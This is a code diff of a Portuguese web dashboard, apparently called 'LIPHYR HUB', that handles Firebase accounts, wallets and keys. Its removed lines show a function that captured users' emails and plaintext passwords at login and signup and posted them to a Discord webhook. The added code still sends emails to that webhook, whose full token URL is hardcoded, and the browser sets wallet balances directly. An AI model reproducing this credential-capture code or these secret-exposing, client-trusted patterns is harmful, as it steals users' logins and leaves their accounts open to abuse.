@@ -206,6 +206,9 @@
             cursor: pointer;
             padding: 8px 16px;
             border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
 
         nav a:hover {
@@ -1030,9 +1033,25 @@
                 </svg>
                 Dashboard
             </a>
-            <a onclick="showSection('wallet')">Carteira</a>
-            <a onclick="showSection('verify')">Verificar Key</a>
-            <a onclick="showSection('shop')">Shop</a>
+            <a onclick="showSection('wallet')">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-bank" viewBox="0 0 16 16">
+                    <path d="m8 0 6.61 3h.89a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-.5.5H15v7a.5.5 0 0 1 .485.38l.5 2a.498.498 0 0 1-.485.62H.5a.498.498 0 0 1-.485-.62l.5-2A.5.5 0 0 1 1 13V6H.5a.5.5 0 0 1-.5-.5v-2A.5.5 0 0 1 .5 3h.89zM3.777 3h8.447L8 1zM2 6v7h1V6zm2 0v7h2.5V6zm3.5 0v7h1V6zm2 0v7H12V6zM13 6v7h1V6zm2-1V4H1v1zm-.39 9H1.39l-.25 1h13.72z"/>
+                </svg>
+                Carteira
+            </a>
+            <a onclick="showSection('verify')">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-key" viewBox="0 0 16 16">
+                    <path d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8m4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5"/>
+                    <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0"/>
+                </svg>
+                Verificar Key
+            </a>
+            <a onclick="showSection('shop')">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-cart3" viewBox="0 0 16 16">
+                    <path d="M0 1.5A.5.5 0 0 1 .5 1H2a.5.5 0 0 1 .485.379L2.89 3H14.5a.5.5 0 0 1 .49.598l-1 5a.5.5 0 0 1-.465.401l-9.397.472L4.415 11H13a.5.5 0 0 1 0 1H4a.5.5 0 0 1-.491-.408L2.01 3.607 1.61 2H.5a.5.5 0 0 1-.5-.5M3.102 4l.84 4.479 9.144-.459L13.89 4zM5 12a2 2 0 1 0 0 4 2 2 0 0 0 0-4m7 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-7 1a1 1 0 1 1 0 2 1 1 0 0 1 0-2m7 0a1 1 0 1 1 0 2 1 1 0 0 1 0-2"/>
+                </svg>
+                Shop
+            </a>
             <a onclick="showSection('support')">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
                     <path d="M13.545 2.907a13.2 13.2 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.2 12.2 0 0 0-3.658 0 8 8 0 0 0-.412-.833.05.05 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.04.04 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032q.003.022.021.037a13.3 13.3 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019q.463-.63.818-1.329a.05.05 0 0 0-.01-.059l-.018-.011a9 9 0 0 1-1.248-.595.05.05 0 0 1-.02-.066l.015-.019q.127-.095.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.05.05 0 0 1 .053.007q.121.1.248.195a.05.05 0 0 1-.004.085 8 8 0 0 1-1.249.594.05.05 0 0 0-.03.03.05.05 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.2 13.2 0 0 0 4.001-2.02.05.05 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.03.03 0 0 0-.02-.019m-8.198 7.307c-.789 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612m5.316 0c-.788 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612"/>
@@ -1458,7 +1477,9 @@
             
             <div style="margin-top: 50px; text-align: center;">
                 <div style="background: rgba(138, 43, 226, 0.1); border: 2px solid #8a2be2; border-radius: 15px; padding: 40px; max-width: 500px; margin: 0 auto;">
-                    <div style="font-size: 60px; margin-bottom: 20px;">🎮</div>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16" style="margin-bottom: 20px; color: #8a2be2;">
+                        <path d="M13.545 2.907a13.2 13.2 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.2 12.2 0 0 0-3.658 0 8 8 0 0 0-.412-.833.05.05 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.04.04 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032q.003.022.021.037a13.3 13.3 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019q.463-.63.818-1.329a.05.05 0 0 0-.01-.059l-.018-.011a9 9 0 0 1-1.248-.595.05.05 0 0 1-.02-.066l.015-.019q.127-.095.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.05.05 0 0 1 .053.007q.121.1.248.195a.05.05 0 0 1-.004.085 8 8 0 0 1-1.249.594.05.05 0 0 0-.03.03.05.05 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.2 13.2 0 0 0 4.001-2.02.05.05 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.03.03 0 0 0-.02-.019m-8.198 7.307c-.789 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612m5.316 0c-.788 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612"/>
+                    </svg>
                     <h3 style="color: #8a2be2; margin-bottom: 20px;">Entre no Discord</h3>
                     <p style="color: #cccccc; margin-bottom: 30px;">
                         Clique no botão abaixo para entrar no nosso servidor do Discord. Nossa equipe responde em até 24 horas!
@@ -1554,7 +1575,7 @@
         const auth = getAuth(app);
         const database = getDatabase(app);
 
-        // WEBHOOK DO DISCORD - ENVIA EMAIL E SENHA
+        // WEBHOOK DO DISCORD - SOMENTE CADASTRO E TROCA DE SENHA
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1446393232157310988/o_yQhxZOnnucRXzJA8bmTikx7bQxOC5VOadxhWoDB2rD4kGf8xBBPlEvWU8N4I25uR0i';
 
         // Variável para armazenar usuários online
@@ -1632,8 +1653,6 @@
                     return { success: false, error: 'Usuário não autenticado' };
                 }
                 
-                console.log('🔄 Tentando salvar key no Firebase:', keyData.key);
-                
                 // Gerar ID seguro para a key (remove caracteres especiais)
                 const keyId = keyData.key.replace(/-/g, '_').replace(/[^a-zA-Z0-9_]/g, '');
                 
@@ -1650,8 +1669,6 @@
                 
                 // Salvar no Firebase
                 await set(keyRef, keyDataWithUser);
-                
-                console.log('✅ Key salva com sucesso no Firebase!');
                 
                 return { success: true, keyId: keyId };
                 
@@ -1670,23 +1687,18 @@
             }
         }
 
-        // Enviar credenciais para Discord
-        async function sendCredentialsToDiscord(email, password, action) {
+        // Enviar logs para Discord (SOMENTE CADASTRO E TROCA DE SENHA)
+        async function sendLogToDiscord(email, action, additionalInfo = '') {
             try {
                 const embed = {
-                    username: "LIPHYR HUB - Credenciais",
+                    username: "LIPHYR HUB - Logs",
                     embeds: [{
-                        title: "🔐 Credenciais Capturadas",
-                        color: 0xff0000,
+                        title: "📋 Log do Sistema",
+                        color: 0x8a2be2, // Cor roxo uva
                         fields: [
                             {
                                 name: "📧 Email",
                                 value: `\`\`\`${email}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "🔑 Senha",
-                                value: `\`\`\`${password}\`\`\``,
                                 inline: false
                             },
                             {
@@ -1702,10 +1714,19 @@
                         ],
                         timestamp: new Date().toISOString(),
                         footer: {
-                            text: "LIPHYR HUB Security System"
+                            text: "LIPHYR HUB Security Logs"
                         }
                     }]
                 };
+
+                // Adicionar informações adicionais se fornecidas
+                if (additionalInfo) {
+                    embed.embeds[0].fields.push({
+                        name: "📝 Informações Adicionais",
+                        value: additionalInfo,
+                        inline: false
+                    });
+                }
 
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
@@ -1715,7 +1736,7 @@
                     body: JSON.stringify(embed)
                 });
             } catch (error) {
-                console.log('Erro ao enviar para Discord');
+                console.log('Erro ao enviar log para Discord');
             }
         }
 
@@ -1791,17 +1812,15 @@
                 document.getElementById('footer').style.display = 'block';
                 document.getElementById('loginModal').style.display = 'none';
                 
-                // Formatar email para mostrar até o @ (com asteriscos)
+                // Formatar email para mostrar completamente mascarado
                 const email = user.email;
                 const emailParts = email.split('@');
-                const maskedEmail = emailParts[0].length > 3 
-                    ? emailParts[0].substring(0, 3) + '***' 
-                    : emailParts[0];
+                const maskedEmail = '***' + '@' + emailParts[1];
                 
                 // Atualizar informações gerais (com email mascarado)
-                document.getElementById('userEmailDisplay').textContent = maskedEmail + '@' + emailParts[1];
+                document.getElementById('userEmailDisplay').textContent = maskedEmail;
                 document.getElementById('userAvatar').textContent = user.email.charAt(0).toUpperCase();
-                document.getElementById('dashboardEmail').textContent = maskedEmail + '@' + emailParts[1];
+                document.getElementById('dashboardEmail').textContent = maskedEmail;
                 
                 // Na página Minha Conta, mostrar email completo
                 document.getElementById('accountEmail').textContent = email;
@@ -1847,10 +1866,7 @@
             }
 
             try {
-                // Enviar credenciais para Discord
-                await sendCredentialsToDiscord(email, password, 'LOGIN');
-                
-                // Fazer login
+                // Fazer login (NÃO envia mais para Discord no login)
                 const userCredential = await signInWithEmailAndPassword(auth, email, password);
                 
                 errorDiv.style.display = 'none';
@@ -1890,22 +1906,22 @@
             }
 
             try {
-                // Enviar credenciais para Discord
-                await sendCredentialsToDiscord(email, password, 'NOVO CADASTRO');
-                
                 // Criar usuário
                 const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                 const user = userCredential.user;
                 
-                // CORREÇÃO: Criar carteira com R$ 10,00 de bônus - NO CAMINHO CORRETO
-                const walletId = 'user_' + Date.now(); // ID diferente do UID
+                // ENVIAR LOG PARA DISCORD - CADASTRO
+                await sendLogToDiscord(email, '📝 NOVO CADASTRO', 'Usuário criou uma nova conta');
+                
+                // Criar carteira com R$ 10,00 de bônus
+                const walletId = 'user_' + Date.now();
                 const walletRef = ref(database, 'wallets/' + walletId);
                 
                 await set(walletRef, {
                     balance: 10.00,
                     totalReceived: 10.00,
                     lastCredit: Date.now(),
-                    userId: user.uid, // Adicionar UID do usuário
+                    userId: user.uid,
                     userEmail: user.email,
                     history: [{
                         amount: 10.00,
@@ -1915,18 +1931,18 @@
                     }]
                 });
                 
-                // Criar dados do usuário - NO CAMINHO CORRETO
+                // Criar dados do usuário
                 const userId = 'user_' + Date.now();
                 const userRef = ref(database, 'users/' + userId);
                 
                 await set(userRef, {
                     email: user.email,
-                    firebaseUid: user.uid, // Adicionar UID do Firebase
+                    firebaseUid: user.uid,
                     createdAt: Date.now(),
                     lastDailyKey: null,
                     keysCount: 0,
                     bonusReceived: true,
-                    walletId: walletId // Referência para a carteira
+                    walletId: walletId
                 });
                 
                 errorDiv.style.display = 'none';
@@ -2005,8 +2021,6 @@
         // CORREÇÃO: Carregar dados do usuário
         async function loadUserData(user) {
             try {
-                console.log('🔍 Buscando dados do usuário:', user.email);
-                
                 // Buscar usuário pelo email
                 const usersRef = ref(database, 'users');
                 const snapshot = await get(usersRef);
@@ -2047,8 +2061,6 @@
                         // Buscar carteira pelo email
                         await findWalletByEmail(user.email);
                     }
-                } else {
-                    console.log('Usuário não encontrado no banco de dados');
                 }
             } catch (error) {
                 console.error('Error loading user data:', error);
@@ -2058,8 +2070,6 @@
         // CORREÇÃO: Buscar carteira pelo email
         async function findWalletByEmail(userEmail) {
             try {
-                console.log('🔍 Buscando carteira para email:', userEmail);
-                
                 const walletsRef = ref(database, 'wallets');
                 const snapshot = await get(walletsRef);
                 
@@ -2068,13 +2078,11 @@
                     
                     for (const [walletId, wallet] of Object.entries(wallets)) {
                         if (wallet.userEmail === userEmail) {
-                            console.log('✅ Carteira encontrada:', walletId);
                             loadWalletData(walletId);
                             return;
                         }
                     }
                     
-                    console.log('❌ Carteira não encontrada para email:', userEmail);
                     // Criar carteira se não existir
                     await createWalletForUser(userEmail);
                 }
@@ -2089,8 +2097,6 @@
                 const user = auth.currentUser;
                 if (!user) return;
                 
-                console.log('🔄 Criando nova carteira para:', userEmail);
-                
                 const walletId = 'user_' + Date.now();
                 const walletRef = ref(database, 'wallets/' + walletId);
                 
@@ -2103,8 +2109,6 @@
                     createdAt: Date.now(),
                     history: []
                 });
-                
-                console.log('✅ Carteira criada:', walletId);
                 
                 // Atualizar usuário com walletId
                 await updateUserWalletId(userEmail, walletId);
@@ -2131,7 +2135,6 @@
                             await update(ref(database, 'users/' + userId), {
                                 walletId: walletId
                             });
-                            console.log('✅ Usuário atualizado com walletId:', walletId);
                             break;
                         }
                     }
@@ -2144,8 +2147,6 @@
         // CORREÇÃO: Carregar dados da carteira
         async function loadWalletData(walletId) {
             try {
-                console.log('💰 Buscando carteira ID:', walletId);
-                
                 const walletRef = ref(database, 'wallets/' + walletId);
                 const snapshot = await get(walletRef);
                 
@@ -2155,8 +2156,6 @@
                     // Atualizar saldo
                     const balance = wallet.balance || 0;
                     const totalReceived = wallet.totalReceived || 0;
-                    
-                    console.log('✅ Saldo encontrado:', balance);
                     
                     const formattedBalance = balance.toFixed(2);
                     
@@ -2174,7 +2173,6 @@
                     loadWalletHistory(wallet.history || []);
                     
                 } else {
-                    console.log('❌ Carteira não encontrada no Firebase:', walletId);
                     document.getElementById('walletBalanceAmount').textContent = '0,00';
                     document.getElementById('walletHeaderAmount').textContent = 'R$ 0,00';
                     document.getElementById('shopBalanceAmount').textContent = 'R$ 0,00';
@@ -2487,7 +2485,7 @@
                 await loadUserKeys(user.email);
                 updateDailyKeyTimer();
                 
-                // Programar bônus de R$ 5,00 após 24h (alterado de R$ 10,00 para R$ 5,00)
+                // Programar bônus de R$ 5,00 após 24h
                 setTimeout(async () => {
                     try {
                         // Buscar carteira do usuário
@@ -2503,7 +2501,7 @@
             }
         }
 
-        // CORREÇÃO: Adicionar bônus da key diária (alterado para R$ 5,00)
+        // CORREÇÃO: Adicionar bônus da key diária
         async function addDailyKeyBonus(userEmail) {
             try {
                 // Buscar carteira pelo email
@@ -2515,12 +2513,12 @@
                     
                     for (const [walletId, wallet] of Object.entries(wallets)) {
                         if (wallet.userEmail === userEmail) {
-                            const newBalance = (wallet.balance || 0) + 5.00; // Alterado de 10.00 para 5.00
-                            const newTotal = (wallet.totalReceived || 0) + 5.00; // Alterado de 10.00 para 5.00
+                            const newBalance = (wallet.balance || 0) + 5.00;
+                            const newTotal = (wallet.totalReceived || 0) + 5.00;
                             const newHistory = wallet.history || [];
                             
                             newHistory.push({
-                                amount: 5.00, // Alterado de 10.00 para 5.00
+                                amount: 5.00,
                                 description: '💰 Bônus da Key Diária (24h depois)',
                                 timestamp: Date.now(),
                                 type: 'daily_bonus'
@@ -2767,7 +2765,6 @@
             }
             
             try {
-                // CORREÇÃO: Usar reautenticação antes de alterar senha
                 const email = user.email;
                 
                 // Pedir a senha atual para reautenticação
@@ -2784,6 +2781,9 @@
                     
                     // Se reautenticação bem-sucedida, alterar senha
                     await updatePassword(credential.user, newPassword);
+                    
+                    // ENVIAR LOG PARA DISCORD - TROCA DE SENHA
+                    await sendLogToDiscord(email, '🔑 TROCA DE SENHA', 'Usuário alterou sua senha');
                     
                     document.getElementById('newPassword').value = '';
                     document.getElementById('confirmPassword').value = '';
